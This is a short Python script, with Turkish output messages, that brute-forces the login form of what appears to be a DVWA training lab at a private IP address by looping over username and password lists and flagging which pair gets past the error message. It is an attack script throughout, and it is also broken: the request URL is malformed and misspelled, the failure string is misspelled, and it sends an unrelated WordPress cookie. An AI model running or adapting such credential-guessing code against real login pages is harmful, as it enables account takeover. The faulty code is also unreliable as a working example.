import requests
header={"Cookie":"__cfduid=d971d240fb2d9f3bfca31bd182664dbd01599769242; wordpress_test_cookie=WP+Cookie+check"}
username_list=["admin","password"]
password_list=["admin","password"]
for i in username_list:
    for j in password_list:
        url="http://10.10.10.10/dvwa/vulnerablities/brute/=usermane"+str(i)+"&password="+str(j)+"&Login=login"
        sonuc=requests.get(url=url,headers=header)
        print("Username",i)
        print("Password",j)
        print("Status code",sonuc.status_code)
        print("Uzunluk:",len(sonuc.content))
        if not "Username and/or password incerrect" in str(sonuc.content):
            print("Kullanıcı adı ve parola dogru")
        print("==================")
